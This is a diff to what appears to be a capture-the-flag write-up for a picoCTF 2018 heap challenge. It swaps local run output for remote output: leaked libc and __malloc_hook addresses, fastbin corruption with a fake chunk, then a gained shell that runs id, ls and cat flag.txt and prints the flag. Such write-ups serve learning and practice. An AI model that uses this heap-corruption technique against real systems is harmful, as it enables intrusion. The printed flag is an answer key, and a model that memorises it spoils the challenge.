@@ -300,10 +300,11 @@ break_heap()
 
 Aaaannnd:
 ```bash
-[*] libc base: 0x7ff658535000
-[*] one gadget: 0x7ff65857a26a
-[*] __malloc_hook: 0x7ff6588f9b10
-[*] Corrupting fastchunk list with fake chunk at: 0x7ff6588f9aed
+[+] Opening connection to 2018shell2.picoctf.com on port 56667: Done
+[*] libc base: 0x7f353f534000
+[*] one gadget: 0x7f353f57926a
+[*] __malloc_hook: 0x7f353f8f8b10
+[*] Corrupting fastchunk list with fake chunk at: 0x7f353f8f8aed
 [*] Switching to interactive mode
 
 Bio must be at most 255 characters.
@@ -364,5 +365,15 @@ Enter your new bio:
 Bio recorded.
 
 Enter your command:
-$
+> $ id
+uid=1143(contacts_2) gid=1144(contacts_2) groups=1144(contacts_2)
+$ ls
+contacts
+flag.txt
+libc.so.6
+xinet_startup.sh
+$ cat flag.txt
+picoCTF{4_5pr3e_0f_d0ubl3_fR33_5289d98f}
+$ 
+[*] Closed connection to 2018shell2.picoctf.com port 56667
 ```
